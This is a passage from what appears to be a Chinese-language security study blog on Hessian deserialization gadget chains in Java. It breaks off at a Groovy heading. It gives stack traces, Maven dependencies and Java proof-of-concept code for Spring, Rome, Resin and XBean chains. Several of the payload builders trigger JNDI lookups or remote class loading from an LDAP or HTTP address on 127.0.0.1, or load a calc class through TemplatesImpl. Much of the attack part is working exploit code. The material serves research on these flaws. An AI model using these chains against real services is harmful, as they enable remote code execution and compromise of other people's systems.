+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化时触发 toString</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hessian2ToStringSer(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    baos.write(<span class="number">67</span>);</span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line"></span><br><span class="line">    <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> hessian2Output.getSerializerFactory();</span><br><span class="line">    serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">    hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line"></span><br><span class="line">    hessian2Output.writeObject(obj);</span><br><span class="line">    hessian2Output.close();</span><br><span class="line">    <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过手动写入第一个字节，达到readString时进入default的效果。</p>
+<h4 id="XString家族"><a href="#XString家族" class="headerlink" title="XString家族"></a>XString家族</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/XStringFSB2toString.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/XStringFSB2toString.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>HashMap#putVal–&gt;AbstractMap#equals–&gt;XString#equals–&gt;xxx#toString</p>
+<p>这里选XStringForFSB</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772363694349-0b380175-6a34-4b73-877a-24d608c0e848.png"  alt="img"></p>
+<p>原理是两个HashMap作为key，在putVal时进行equals比较。HashMap没有equals，其父类AbstractMap有。通过提取内层HashMap的值，再次进行equals，即val2.equals(val1)，这里就是xString.equals(jsonArray)，从而调用jsonArray的toString。建议自己调试一遍，会比较清楚。</p>
+<h4 id="AudioFileFormat-Type"><a href="#AudioFileFormat-Type" class="headerlink" title="AudioFileFormat.Type"></a>AudioFileFormat.Type</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/AudioFileFormat2toString.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/AudioFileFormat2toString.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>跟XString差不多，这次是Type#equals触发：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772364134105-4a31c953-1f0d-4b6a-a332-c3bb9f2368ea.png"  alt="img"></p>
+<h4 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h4><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/ConcurrentHashMap2equals.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/blackhat2025/ConcurrentHashMap2equals.java<i class="fas fa-external-link-alt"></i></a></p>
+<p>看一下调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772364584397-cbe9043d-177f-4a80-8b22-e8a65b42afa7.png"  alt="img"></p>
+<p>这里其实和HashMap差不多，可以当作HashMap被禁用时的平替。</p>
+<h2 id="出网JNDI打法"><a href="#出网JNDI打法" class="headerlink" title="出网JNDI打法"></a>出网JNDI打法</h2><h3 id="Spring-PartiallyComparableAdvisorHolder"><a href="#Spring-PartiallyComparableAdvisorHolder" class="headerlink" title="Spring PartiallyComparableAdvisorHolder"></a>Spring PartiallyComparableAdvisorHolder</h3><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/SpringBased.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/SpringBased.java<i class="fas fa-external-link-alt"></i></a>  advisorHolder()</p>
+<p>需要有spring-aop，spring-context依赖。</p>
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.springframework.jndi.JndiTemplate.lambda$lookup$0(JndiTemplate.java:157)</span><br><span class="line">at org.springframework.jndi.JndiTemplate$$Lambda$1.1059063940.doInContext(Unknown Source:-1)</span><br><span class="line">at org.springframework.jndi.JndiTemplate.execute(JndiTemplate.java:92)</span><br><span class="line">at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:157)</span><br><span class="line">at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:179)</span><br><span class="line">at org.springframework.jndi.JndiLocatorSupport.lookup(JndiLocatorSupport.java:96)</span><br><span class="line">at org.springframework.jndi.support.SimpleJndiBeanFactory.doGetType(SimpleJndiBeanFactory.java:285)</span><br><span class="line">at org.springframework.jndi.support.SimpleJndiBeanFactory.getType(SimpleJndiBeanFactory.java:245)</span><br><span class="line">at org.springframework.jndi.support.SimpleJndiBeanFactory.getType(SimpleJndiBeanFactory.java:238)</span><br><span class="line">at org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory.getOrder(BeanFactoryAspectInstanceFactory.java:136)</span><br><span class="line">at org.springframework.aop.aspectj.AbstractAspectJAdvice.getOrder(AbstractAspectJAdvice.java:223)</span><br><span class="line">at org.springframework.aop.aspectj.AspectJPointcutAdvisor.getOrder(AspectJPointcutAdvisor.java:66)</span><br><span class="line">at org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString(AspectJAwareAdvisorAutoProxyCreator.java:147)</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals(XString.java:392)</span><br><span class="line">at org.springframework.aop.target.HotSwappableTargetSource.equals(HotSwappableTargetSource.java:103)</span><br><span class="line">at java.util.HashMap.putVal(HashMap.java:634)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:114)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:577)</span><br><span class="line">at com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2093)</span><br><span class="line">at tools.HessianTools.hessianDeser(HessianTools.java:69)</span><br><span class="line">at com.test.gadget.SpringBased.main(SpringBased.java:24)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Spring-AbstractBeanFactoryPointcutAdvisor"><a href="#Spring-AbstractBeanFactoryPointcutAdvisor" class="headerlink" title="Spring AbstractBeanFactoryPointcutAdvisor"></a>Spring AbstractBeanFactoryPointcutAdvisor</h3><p>POC：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/SpringBased.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/SpringBased.java<i class="fas fa-external-link-alt"></i></a>  pointcutAdvisor()</p>
+<p>需要spring-aop，spring-context依赖。</p>
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.jndi.JndiLocatorSupport.lookup(JndiLocatorSupport.java:92)</span><br><span class="line">at org.springframework.jndi.support.SimpleJndiBeanFactory.doGetSingleton(SimpleJndiBeanFactory.java:271)</span><br><span class="line">at org.springframework.jndi.support.SimpleJndiBeanFactory.getBean(SimpleJndiBeanFactory.java:116)</span><br><span class="line">at org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor.getAdvice(AbstractBeanFactoryPointcutAdvisor.java:116)</span><br><span class="line">at org.springframework.aop.support.AbstractPointcutAdvisor.equals(AbstractPointcutAdvisor.java:76)</span><br><span class="line">at org.springframework.aop.target.HotSwappableTargetSource.equals(HotSwappableTargetSource.java:103)</span><br><span class="line">at java.util.HashMap.putVal(HashMap.java:634)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:114)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:577)</span><br><span class="line">at com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2093)</span><br><span class="line">at tools.HessianTools.hessianDeser(HessianTools.java:69)</span><br><span class="line">at com.test.gadget.SpringBased.main(SpringBased.java:24)</span><br></pre></td></tr></table></figure>
+
+<p>这两条Spring的链子，最关键的类是SimpleJndiBeanFactory。这个类是最终触发lookup的。所以找链子时，可以把这个类的，能够触发lookup的方法当作sink，把equals当作source，然后通过tabby等静态分析工具进行利用链搜索。</p>
+<p>能够调用lookup的几个方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1772366287469-f14be9b8-ce04-4906-9c9e-a3a1c509d9a3.png"  alt="img"></p>
+<h3 id="Rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h3><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/RomeBased.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/RomeBased.java<i class="fas fa-external-link-alt"></i></a> </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过ToStringBean触发getter方法，来进行后续利用。一般接JdbcRowSetImpl打JNDI或者SignedObject二次反序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">rome2Jndi</span><span class="params">(String version)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">    jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:50389/eae633&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = ReflectTools.makeMap(equalsBean, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = HessianTools.hessianSer2bytes(hashMap, version);</span><br><span class="line">    HessianTools.hessianDeser(bytes, version);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二次反序列化</span></span><br><span class="line"><span class="comment">// 会触发三次，因为ToStringBean.printProperty间接触发两次EqualsBean.hashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">rome2SignedObj</span><span class="params">(String version)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesGen.getTemplates1(<span class="literal">null</span>, <span class="string">&quot;D:/1tmp/classes/CalcAbs.class&quot;</span>);</span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = ReflectTools.makeMap(equalsBean, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 SignedObject 所需的密钥和签名工具</span></span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">    keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">    <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">    <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建 SignedObject 对象，对 map 进行签名</span></span><br><span class="line">    <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean2);</span><br><span class="line">    Map&lt;Object, Object&gt; hashMap2 = ReflectTools.makeMap(equalsBean2, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = HessianTools.hessianSer2bytes(hashMap2, version);</span><br><span class="line">    HessianTools.hessianDeser(bytes, version);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Resin链"><a href="#Resin链" class="headerlink" title="Resin链"></a>Resin链</h3><p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/ResinGadget.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/ResinGadget.java<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>限制比较大，只能rmi加载远程工厂类，所以只能打jdk&lt;8u121的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refAddr</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> <span class="string">&quot;Calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName, refClassName, refAddr);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">cannotProceedException</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();</span><br><span class="line">        ReflectTools.setFieldValue(cannotProceedException, <span class="string">&quot;resolvedObj&quot;</span>, ref);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; contiC = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">continuationContext</span> <span class="operator">=</span> (Context) UnsafeTools.getObjectByUnsafe(contiC);</span><br><span class="line">        ReflectTools.setFieldValue(continuationContext, <span class="string">&quot;cpe&quot;</span>, cannotProceedException);</span><br><span class="line">        ReflectTools.setFieldValue(continuationContext, <span class="string">&quot;env&quot;</span>, <span class="keyword">new</span> <span class="title class_">Hashtable</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建QName</span></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(continuationContext, <span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">// 实现hash碰撞</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">        <span class="comment">// 创建Xtring</span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; finalMap = ReflectTools.makeMap(qName, xString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> finalMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\u0915\u0009\u001e\u000c\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>不过这里如何实现hash碰撞的方法值得学习，通过阅读XString的hashCode方法，从而得到unhash方法，进而确保putVal时，一定触发equals。</p>
+<h3 id="XBean链"><a href="#XBean链" class="headerlink" title="XBean链"></a>XBean链</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/XBeanGadget.java" >https://github.com/1diot9/MyJavaSecStudy/blob/main/hessian/src/main/java/com/test/gadget/XBeanGadget.java<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">refAddr</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> <span class="string">&quot;Calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName, refClassName, refAddr);</span><br><span class="line">    <span class="type">WritableContext</span> <span class="variable">writableContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WritableContext</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建ReadOnlyBinding对象</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding&quot;</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">readOnlyBinding</span> <span class="operator">=</span> Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class)</span><br><span class="line">            .newInstance(<span class="string">&quot;aaa&quot;</span>, ref, writableContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; finalMap = ReflectTools.makeEqualMap(xString, readOnlyBinding);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> finalMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟Resin链一样，限制比较大。</p>
+<h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
